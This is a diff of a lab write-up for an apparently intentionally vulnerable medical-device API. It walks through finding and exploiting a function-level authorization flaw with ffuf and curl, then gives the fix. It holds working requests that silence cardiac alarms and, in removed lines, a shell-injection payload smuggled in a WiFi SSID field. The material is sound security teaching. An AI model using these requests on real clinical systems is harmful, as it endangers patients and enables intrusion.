@@ -1,5 +1,5 @@
 ---
-id: API6:2023
+id: API5:2023
 title: Broken Function Level Authorization (BFLA)
 category: API
 status: DONE
@@ -15,9 +15,9 @@ affected_components:
 verified_date: 2026-05-02
 ---
 
-# API6 — Broken Function Level Authorization (BFLA)
+# API5 — Broken Function Level Authorization (BFLA)
 
-> **Source docs:** `CareOtter_Test_Suite.md` §API-06, `CareOtter_API.md` Vulnerability Surface #8  
+> **Source docs:** `CareOtter_Test_Suite.md` §API-05, `CareOtter_API.md` Vulnerability Surface #8  
 > **OWASP:** API5 — Broken Function Level Authorization  
 > **CWE:** CWE-863 (Incorrect Authorization) / CWE-285  
 > **Severity:** High
@@ -30,7 +30,7 @@ Authentication answers the question *"Who are you?"* Authorization answers *"Wha
 
 This is a classic **Broken Function Level Authorization (BFLA)** vulnerability: a low-privilege user (patient) can exercise high-privilege functions (administrative device management) with nothing more than their own legitimate credentials.
 
-The impact is severe because the affected endpoints are not merely "informational." They include WiFi reconfiguration (which is vulnerable to shell injection via IGP 0x06), clinical threshold modification, service restart, and raw log exfiltration. A patient who simply wants to view their own vitals can, accidentally or maliciously, obtain the hospital WiFi PSK, silence all cardiac alarms, or obtain a remote root shell on the bedside monitor.
+In this lab the live BFLA has been **narrowed to a single endpoint** — `POST /api/config/thresholds` — while the remaining administrative routes (`/api/network`, `/api/network/wifi`, `/api/config/preferences`, `/api/services/restart`, `/api/logs`) were corrected to `@admin_required` and now reject a patient token with `403 Forbidden`. The exposure is still clinically serious: with nothing but their own credentials a patient can rewrite the cardiac alert thresholds (`bpm_min=0`, `spo2_min=0`), silencing every alarm on the bedside monitor — and the same response leaks the IGP request frame, chaining into the API4 denial-of-service (see Step 4).
 
 ---
 
@@ -95,6 +95,66 @@ Because the REST layer lacks role enforcement, any user who can obtain a valid J
 
 ---
 
+## Discovery / Enumeration
+
+Before exploiting the BFLA the attacker has to find **which** of the API's ~40 routes is the mis-authorized one. In this lab that endpoint is **not leaked to the patient client** — it is absent from the patient/caregiver static JS (`panel.js`, `caregiver_dashboard.js`…), the mobile app sets thresholds over **IGP** (`IgpClient.setThreshold`, port 9999) rather than the cloud route, and there is no Swagger/OpenAPI spec. Discovery is therefore **active enumeration**, not passive reading.
+
+### 1. Enumerate the endpoint surface
+
+**Content discovery (fuzzing).** Authenticated with their own patient JWT, the attacker fuzzes paths and reads the **status code as an authorization map**:
+
+```bash
+JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
+  -H "Content-Type: application/json" \
+  -d '{"username":"john_doe","password":"johnny123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+ffuf -u http://localhost:5002/api/config/FUZZ -w params.txt -X POST \
+  -H "Authorization: Bearer $JWT_PATIENT" -H "Content-Type: application/json" \
+  -d '{}' -mc all -fc 404
+# thresholds → 200   ·   preferences → 403
+```
+
+| Code (with a patient JWT) | Meaning |
+| ------------------------- | ------- |
+| `404` | endpoint does not exist |
+| `401` | exists, no/invalid auth |
+| `403` | exists but requires **admin role** (`@admin_required`) — a protected admin endpoint |
+| `405` | wrong HTTP method — the `Allow:` response header reveals the valid verbs |
+| `200`/`2xx` | exists and the **patient is allowed** to call it |
+
+**Client / convention inference.** The mobile app's `IgpClient` exposes the device command taxonomy (`CMD_SET_THRESHOLD 0x08`, `CMD_GET_NETWORK 0x03`, `CMD_SET_WIFI 0x06`…); the Cloud API mirrors these as `/api/config/thresholds`, `/api/network`, `/api/network/wifi`, so the admin route names are guessable even though the app drives them over IGP. The admin web templates (`config.html`, `network.html`, `logs.html`) also embed these paths in inline JS — reachable if the attacker obtains that source (LFI, a static-route misconfig, or the lab material itself).
+
+### 2. Identify which endpoints are BFLA-vulnerable (role differential)
+
+With the surface mapped, replay every administrative endpoint **with the correct HTTP method** and the **low-privilege patient JWT**, flagging any admin function that answers `2xx` instead of `403`:
+
+```bash
+while read method ep; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" \
+         -H "Authorization: Bearer $JWT_PATIENT" -H "Content-Type: application/json" \
+         -d '{}' "http://localhost:5002$ep")
+  echo "$code  $method $ep"
+done <<'EOF'
+GET  /api/network
+POST /api/config/preferences
+POST /api/config/thresholds
+POST /api/services/restart
+GET  /api/logs
+EOF
+# 403  GET  /api/network             ← admin_required (protected)
+# 403  POST /api/config/preferences  ← admin_required (protected)
+# 200  POST /api/config/thresholds   ← token_required  ★ BFLA
+# 403  POST /api/services/restart    ← admin_required (protected)
+# 403  GET  /api/logs                ← admin_required (protected)
+```
+
+> Use the **right verb** per route: a `POST` to a `GET`-only endpoint returns `405`, not `403`, which would muddy the differential.
+
+The **authorization oracle** for "what *should* be admin-only" is the Web UI: the `/admin/*` routes redirect a patient to login (the web layer enforces the role), so any REST counterpart a patient can still reach is mis-authorized. Generalised, build a **role × endpoint matrix** (patient / caregiver / admin); every cell where a low role reaches a high-role function is a BFLA. Here the matrix has exactly **one** offending cell: `POST /api/config/thresholds`.
+
+---
+
 ## Steps to Reproduce
 
 **Precondition:** The system must be initialized (users exist). If the database is empty, run:
@@ -134,16 +194,9 @@ Expected output:
 }
 ```
 
-### Step 3 — Access admin endpoints with the patient token
+### Step 3 — Exploit the BFLA: modify clinical thresholds with a patient token
 
-**3A. WiFi PSK disclosure (information disclosure + BFLA):**
-
-```bash
-curl -s -H "Authorization: Bearer $JWT_PATIENT" \
-  http://localhost:5002/api/network | python3 -m json.tool
-```
-
-**3B. Modify clinical thresholds (patient safety compromise):**
+`POST /api/config/thresholds` is the one administrative endpoint still guarded by `@token_required` (authentication only), so the patient token is accepted and the clinical alert thresholds are overwritten — `bpm_min=0`, `bpm_max=255`, `spo2_min=0` silences every BPM/SpO₂ alarm on the bedside monitor:
 
 ```bash
 curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
@@ -152,29 +205,7 @@ curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
   http://localhost:5002/api/config/thresholds
 ```
 
-**3C. Restart the medical sensor service (denial of clinical monitoring):**
-
-```bash
-curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
-  -H "Content-Type: application/json" \
-  -d '{"service":"medical-sensor"}' \
-  http://localhost:5002/api/services/restart
-```
-
-**3D. Shell injection via WiFi configuration (privilege escalation to RCE):**
-
-```bash
-curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
-  -H "Content-Type: application/json" \
-  -d '{"ssid":"'\''; touch /tmp/patient_pwned #","password":"12345678"}' \
-  http://localhost:5002/api/network/wifi
-```
-
-Then verify on the Raspberry Pi:
-```bash
-ls -la /tmp/patient_pwned
-# File created by patient-owned token via "admin" endpoint
-```
+> **The other admin endpoints are now properly authorized.** `GET /api/network`, `POST /api/network/wifi`, `POST /api/config/preferences`, `POST /api/services/restart` and `GET /api/logs` were narrowed to `@admin_required` and return **`403 Forbidden`** to a patient token. That 200-vs-403 split is exactly what the **Discovery / Enumeration** differential above surfaces — only `/api/config/thresholds` is the live BFLA.
 
 ### Step 4 — Chain: leak the IGP MAGIC, then enable the API4 DoS
 
@@ -191,7 +222,7 @@ python3 -c "print(bytes.fromhex('4341524508000009bb0400320078cc015a')[:4])"
 # b'CARE'   ← the IGP protocol MAGIC (0x43415245)
 ```
 
-![[api6_chain_api4_hex_string.png]]
+![[api5_chain_api4_hex_string.png]]
 The first 4 bytes decode to the protocol **MAGIC `0x43415245` ("CARE")**, followed by
 the `0x08` command framing. A patient who reached this admin endpoint via the BFLA now
 knows how to build *valid* IGP frames — the prerequisite for the
@@ -199,22 +230,21 @@ knows how to build *valid* IGP frames — the prerequisite for the
 connection flood of `:9999`. In secure mode (`VULNERABLE=0`) the `igp_request` field is
 omitted (same strip as the `GET_NETWORK` `raw` field).
 
-![[api6_cyberchef_magic_number.png]]
+![[api5_cyberchef_magic_number.png]]
 
-> **Chain:** API6 (BFLA reaches `set_thresholds`) → information disclosure of the IGP
+> **Chain:** API5 (BFLA reaches `set_thresholds`) → information disclosure of the IGP
 > request frame → API4 (valid-frame flood of the careservice command channel).
 
 ---
 
 ## Expected Result
 
-All four requests above return `200 OK` (or `201`/`202`) instead of `403 Forbidden`. The patient token is accepted because `@token_required` validates the JWT signature and expiration but **never evaluates the `role` claim**.
+`POST /api/config/thresholds` returns `200 OK` with a patient token instead of `403 Forbidden`. The token is accepted because `@token_required` validates the JWT signature and expiration but **never evaluates the `role` claim**. The response is `THRESHOLDS_UPDATED` with BPM range `0–255` and SpO₂ minimum `0`, effectively disabling all clinical alerts; in vulnerable mode it also carries the `igp_request` field (Step 4).
 
-Specifically:
-- `/api/network` returns the full `raw` field containing `/etc/config/wireless` with the PSK in plaintext.
-- `/api/config/thresholds` returns `THRESHOLDS_UPDATED` with BPM range `0–255` and SpO₂ minimum `0`, effectively disabling all clinical alerts.
-- `/api/services/restart` returns `REBOOT_OK` and the medical sensor stops streaming.
-- `/api/network/wifi` returns `WIFI_UPDATED` and the injected shell command executes on the Pi.
+The remaining administrative endpoints behave as the secure baseline — a patient token receives **`403 Forbidden`**:
+- `GET /api/network`, `POST /api/network/wifi`, `POST /api/config/preferences`, `POST /api/services/restart`, `GET /api/logs` → `403` (`@admin_required`).
+
+That single `200` among `403`s is the BFLA signature the role differential in *Discovery / Enumeration* pinpoints.
 
 ---
 
@@ -236,15 +266,10 @@ def admin_required(f):
     return decorated
 ```
 
-Then replace `@token_required` with `@admin_required` on:
-- `GET /api/network`
-- `POST /api/network/wifi`
-- `POST /api/config/preferences`
-- `POST /api/config/thresholds`
-- `POST /api/services/restart`
-- `GET /api/logs`
-- `GET /api/devices`
-- `POST /api/devices`
+This `@admin_required` guard has **already been applied to every administrative REST route except** `POST /api/config/thresholds`, which is intentionally left on `@token_required` as the lab's BFLA. The remaining fix is therefore to guard the last one:
+- `POST /api/config/thresholds` → switch `@token_required` to `@admin_required`
+
+Already corrected (they return `403` to a patient today): `GET /api/network`, `POST /api/network/wifi`, `POST /api/config/preferences`, `POST /api/services/restart`, `GET /api/logs`.
 
 Endpoints that are legitimately accessible to both roles (e.g., `GET /api/vitals`, `GET /api/vitals/history`) can continue using `@token_required`, but should ideally use `@role_required('admin', 'patient')` for explicitness.
 
@@ -265,10 +290,10 @@ Endpoints that are legitimately accessible to both roles (e.g., `GET /api/vitals
 
 - [ ] Patient JWT successfully authenticates at `/api/auth/login/patient`
 - [ ] Patient JWT payload contains `"role": "patient"`
-- [ ] `GET /api/network` with patient JWT returns `200 OK` and exposes `raw` field with WiFi PSK
-- [ ] `POST /api/config/thresholds` with patient JWT returns `200 OK` (not `403`)
-- [ ] `POST /api/services/restart` with patient JWT returns `200 OK` (not `403`)
-- [ ] `POST /api/network/wifi` with patient JWT executes shell commands on the Pi
+- [ ] **Discovery:** fuzzing `/api/config/FUZZ` with the patient JWT returns `200` for `thresholds` and `403` for `preferences`
+- [ ] **Differential:** the role-replay loop shows exactly one `200` (`POST /api/config/thresholds`) among `403`s for the other admin endpoints
+- [ ] `POST /api/config/thresholds` with patient JWT returns `200 OK` (not `403`) and sets `bpm_min=0` / `spo2_min=0`
+- [ ] Negative control: `GET /api/network`, `POST /api/services/restart`, `POST /api/network/wifi` with patient JWT all return `403`
 - [ ] Web UI `/admin/dashboard` with patient cookie redirects to login (confirms UI layer is protected)
 
 ---
